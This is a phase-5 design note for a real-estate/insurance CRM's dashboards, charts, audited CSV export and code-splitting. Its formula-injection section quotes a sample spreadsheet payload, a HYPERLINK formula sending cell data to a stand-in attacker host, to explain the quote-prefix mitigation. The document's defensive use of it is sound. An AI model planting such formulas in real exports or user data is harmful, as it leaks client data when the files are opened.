# Phase 5 — dashboards and export

*Continues [phase-4-document-storage.md](phase-4-document-storage.md). Same
`feature(why we chose it)` format.*

Closes out `PLAN.md` §7 (the dashboard blocks) and the "CSV/Excel export" line under the
admin dashboard. Also retires three Phase 1 RPCs that had been dead code since they were
written — `conversion_trend`, `activity_summary` and `source_performance` all existed, were
tested, granted and documented, and nothing rendered them.

---

## What is here

| File | Contains |
|---|---|
| `…001300_export_audit.sql` | `log_export()` — the audit record §11 requires |
| `lib/csv.ts` | CSV generation, formula-injection mitigation, UTF-8 BOM |
| `lib/chart-palette.ts` | The validated ramps and mark specs |
| `hooks/useExport.ts` | Leads and leaderboard exports |
| `components/charts/*` | `ChartCard` (+ table view), funnel, trend, activity mix |
| `app/(app)/dashboard/page.tsx` | All of it wired, plus the source-performance table |

---

## The decisions

### Exports are audited, and the audit is not fire-and-forget

§11 lists exports alongside reassignment and visibility flips as things the audit log must
record. An export is the only action in the product that moves client PII *out* — past every
RLS policy, into a spreadsheet, beyond further control. Under the DPDP Act that is precisely
the event a controller must be able to account for.

`audit_log` has no client INSERT policy (Phase 1, deliberately), and a client-initiated
export has no trigger to hang off. So `log_export()` is a `SECURITY DEFINER` writer into a
tamper-proof admin-only table — which makes it a write primitive worth constraining hard:
the entity is **allow-listed**, the actor comes from the session rather than a parameter, and
the payload is shaped and size-capped here. Unconstrained, any broker could stuff arbitrary
JSON into the audit trail and turn evidence into a graffiti wall.

In `useExport.ts` the log happens **before** the download and its failure aborts the export.
An audit trail that can be skipped by ignoring a failed write is not an audit trail; better
to refuse the export than hand over client data with no record it left.

### CSV formula injection

A cell beginning `=` `+` `-` `@` is executed as a *formula* by Excel and Google Sheets. Lead
names and descriptions here are free text typed by brokers and — via website-form and
IndiaMART intake (§3) — partly by strangers. A lead named
`=HYPERLINK("https://evil.tld?d="&A1,"Click")` becomes a live exfiltration link the moment an
admin opens the export.

`lib/csv.ts` prefixes any such cell with a single quote, which spreadsheets strip on display
and treat as text. This is the export-side equivalent of the care taken in the schema, and
it is why exports are built through one module rather than ad hoc at each call site.

The UTF-8 BOM is the other non-obvious bit: without it Excel opens the file as mojibake, and
§12 item 6 makes Hindi and Bengali first-class.

### Colour was computed, not chosen — and that caught two things

The palette was validated with the skill's script rather than eyeballed, in both directions:

- The **ordinal funnel ramp** failed twice before passing. The light end sat at **1.22:1**
  against the surface (effectively invisible) and the last two steps were **0.055** apart in
  lightness (indistinguishable). Final ramp passes monotone-L, ≥0.06 step gaps, and a 2.10:1
  light end.
- The **axis and value-label colour** was `--p-text-tertiary` `#9CA3AF` — the natural pick
  for recessive chart chrome, and **2.54:1** against white. Axis ticks and direct value
  labels at 11px *are* text; they carry numbers unavailable from bar length. Moved to
  `--p-text-secondary` `#6B7280` at **4.83:1**. "Recessive" governs weight and size, not
  legibility.

Neither was visible by looking. Both came from running a check.

### Ordinal vs categorical, decided by a test rather than by taste

Pipeline stages are **ordinal**: reordering New → Contacted → … → Converted changes what the
chart means. So they take one hue in monotone lightness steps and the funnel's direction is
readable in the colour itself. Activity types are **nominal** — reordering Call/WhatsApp/Email
changes nothing — so every bar takes the same slot-1 hue. Colouring nominal bars by value
would double-encode what bar length already shows and spend the identity channel on nothing.

### Source performance is a table, on purpose

Four measures per source (received, converted, rate, premium), where count and rate are
different scales. Plotting count and rate together would need a dual axis, which invents a
correlation that is not in the data — the single most misleading thing a chart can do. Four
measures across N rows is what a table is for. The inline meter re-encodes the rate already
printed beside it, so it is redundancy rather than the only way to read the value.

Similarly, conversion rate is kept off the received-vs-converted line chart. Both series
there are counts of leads, so one shared axis is honest and the gap between the lines *is*
the conversion story; the rate lives on its own stat tile.

### Recharts is code-split, because the dashboard is the landing screen

Wiring the charts in took `/dashboard` from **6.15 kB to 114 kB**, and its first-load JS from
194 kB to **312 kB** — about 108 kB of Recharts. The build reported it plainly; it would have
been easy to skim past as "the build passed".

That is the wrong trade on this screen in particular. `/` redirects to `/dashboard`, so it is
the landing view, and §1's users are field brokers opening the app on a phone on Indian
mobile data. What they come for is the top of the page — follow-ups due today, overdue count,
conversion rate. None of that needs a charting library and none of it should wait on one.

So the three charts load through `next/dynamic` with `ssr: false`
(`components/charts/lazy.tsx`). The stat tiles paint from the initial bundle and the charts
fill in after. Measured, not assumed:

| `/dashboard` | Route | First Load JS |
|---|---|---|
| before charts | 6.15 kB | 194 kB |
| charts added | 114 kB | 312 kB |
| after code-split | **8.15 kB** | **209 kB** |

The charts now cost 15 kB on first load rather than 118 kB. Verified structurally too:
Recharts sits alone in its own chunk and appears in none of the dashboard's eager chunk set. `ssr: false` is correct rather than merely convenient here: Recharts measures
the DOM to size `ResponsiveContainer`, so server-rendering it produces markup that is
immediately discarded.

Each placeholder reserves its chart's real height, so nothing shifts when the library lands —
the same layout-jump concern behind `ChartCard`'s no-skeleton-on-refetch rule.

### Every chart has a table view

`ChartCard` carries the toggle, so the requirement is met once instead of per-chart and
cannot be forgotten on the fourth chart someone adds. A value that exists only as a bar
length, or only inside a tooltip, is unreachable for a screen reader and for anyone who
cannot resolve the colours — and it is also just what people want when reading an exact
figure.

Two other things live in the frame for the same reason: refetch holds the previous render at
reduced opacity rather than flashing a skeleton (which would collapse the card and bounce the
page), and container heights include the axis band rather than only the plot.

---

## Verification status

`pnpm typecheck` clean. `pnpm build` clean with no `.env` file present. The migration parses
against the real PostgreSQL grammar.

Charts were **rendered and inspected**, not just reasoned about — the skill's last step. A
static harness reproduced all three at their real dimensions, and the geometry was measured
programmatically: no text overflow past the SVG bounds, no bottom-clipping, no label
collisions on any shared baseline, axis band inside the container height on all three. That
is stronger than eyeballing for exactly the failures the anti-pattern list names.

What that does **not** cover: the harness reproduces the geometry, not Recharts itself. Axis
tick density, `ResponsiveContainer` behaviour at narrow mobile widths, and tooltip placement
are Recharts' own and remain unverified.

**And the standing gap is unchanged: none of this has run against a live database.** Five
phases now. The export path in particular has never fetched a row, `log_export` has never
inserted, and no CSV has been opened in a spreadsheet — so the formula-injection mitigation
is reasoned, not observed. The charts have never been handed real RPC output.

---

## What is next

The recommendation from the start of this phase stands, and is now five phases overdue:
**run it against a database.** No Docker is needed — a free hosted Supabase project plus
`link` → `db push` → `test db --linked` executes all 61 pgTAP assertions and every migration.

After that: Realtime, the Capacitor wrap, the orphaned-object sweep from Phase 4, and
policy/renewal tracking (the `policies` table still has full RLS and no UI, so converted
business remains unrecordable and the premium column in the source table above will read
zero until it exists).
